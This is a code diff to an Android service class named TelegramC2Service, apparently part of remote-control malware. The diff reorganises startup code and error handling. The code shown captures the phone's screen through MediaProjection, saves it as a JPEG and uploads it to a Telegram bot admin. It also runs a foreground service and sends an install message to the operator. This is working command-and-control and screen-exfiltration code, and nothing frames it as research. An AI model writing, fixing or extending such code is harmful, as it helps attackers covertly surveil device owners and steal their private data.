@@ -24,7 +24,6 @@ import android.os.HandlerThread;
 import android.os.IBinder;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
-
 import java.io.File;
 import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
@@ -45,24 +44,19 @@ public class TelegramC2Service extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-
         try {
             ConfigLoader.load(this);
+            projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            createNotificationChannel();
+            startForeground(NOTIFICATION_ID, createNotification());
             sendInstallMessage();
+            startWorker();
+            screenshotThread = new HandlerThread("ScreenshotHandler");
+            screenshotThread.start();
+            screenshotHandler = new Handler(screenshotThread.getLooper());
         } catch (Exception e) {
-            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
+            ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
         }
-
-        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        createNotificationChannel();
-        // Start as a general foreground service
-        startForeground(NOTIFICATION_ID, createNotification());
-
-        startWorker();
-
-        screenshotThread = new HandlerThread("ScreenshotHandler");
-        screenshotThread.start();
-        screenshotHandler = new Handler(screenshotThread.getLooper());
     }
 
     @Override
@@ -89,14 +83,12 @@ public class TelegramC2Service extends Service {
 
     private void handleScreenshotResult(int resultCode, Intent data) {
         try {
-            // FIXED: Promote the service to a 'mediaProjection' type foreground service
-            // BEFORE starting the screen capture. This is mandatory on Android 10+
-            // and resolves the SecurityException crash.
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
 
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+
             if (mediaProjection != null) {
                 mediaProjection.registerCallback(new MediaProjection.Callback() {
                     @Override
@@ -106,6 +98,8 @@ public class TelegramC2Service extends Service {
                     }
                 }, screenshotHandler);
                 captureScreenshot();
+            } else {
+                TelegramBotWorker.sendMessage("MediaProjection is null. Cannot capture screen.", this);
             }
         } catch (Exception e) {
             ErrorLogger.logError(this, "HandleScreenshotResult", e);
@@ -152,14 +146,13 @@ public class TelegramC2Service extends Service {
                             croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                         }
                         croppedBitmap.recycle();
-
                         TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
                     } else {
                          TelegramBotWorker.sendMessage("Failed to acquire image for screenshot.", this);
                     }
                 } catch (Exception e) {
-                    ErrorLogger.logError(this, "ScreenshotCapture", e);
-                    TelegramBotWorker.sendMessage("Exception during screenshot capture: " + e.getMessage(), this);
+                    ErrorLogger.logError(this, "ScreenshotCapture_Inner", e);
+                    TelegramBotWorker.sendMessage("Exception during bitmap processing: " + e.getMessage(), this);
                 } finally {
                     if (image != null) image.close();
                     stopScreenshot();
@@ -167,9 +160,9 @@ public class TelegramC2Service extends Service {
             }, 300);
 
         } catch (Exception e) {
-            ErrorLogger.logError(this, "captureScreenshotSetup", e);
-            TelegramBotWorker.sendMessage("Failed to setup screenshot capture: " + e.getMessage(), this);
-            stopScreenshot();
+             ErrorLogger.logError(this, "captureScreenshotSetup", e);
+             TelegramBotWorker.sendMessage("Failed to setup screenshot capture: " + e.getMessage(), this);
+             stopScreenshot();
         }
     }
 
